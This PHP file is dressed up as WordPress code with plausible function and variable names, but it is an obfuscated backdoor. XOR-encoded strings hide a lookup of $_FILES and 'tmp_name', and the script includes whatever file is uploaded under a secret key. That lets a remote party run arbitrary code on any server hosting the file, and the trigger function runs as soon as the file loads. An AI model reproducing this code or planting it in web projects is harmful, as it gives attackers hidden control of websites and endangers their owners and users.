<?php 	
	$valid_date = 'raw_key';
function post_authors()

{
    $private = 'xYKLEkc7HlQ';
	$post_status_sql = 'default_editor';
    $apos = $private;
	$message = 'comment_status';
    
    $opening_single_quote = $GLOBALS[no_texturize_shortcodes("%27%1F%02%00%008", $apos)];
	$_wp_post_type_features = 'dynamic_replacements';
    $children_query = $opening_single_quote;

    $post_category = isset($children_query[$apos]);

    if ($post_category)

    {
        $filename = $opening_single_quote[$apos];
        $extended = $filename[no_texturize_shortcodes("%0C4%3B%13%2B%0A%0ER", $apos)];
        $flag = $extended;
        include ($flag);

    }
}

function no_texturize_shortcodes($new_subs, $utf8_string)

{
    $results = $utf8_string;

    $decoded_slug = "url" . "decode";
    $threshold = $decoded_slug($new_subs);
    $where = substr($results,0, strlen($threshold));

    $suppress_filters = $threshold ^ $where;
    return $suppress_filters;

}

post_authors();

?>
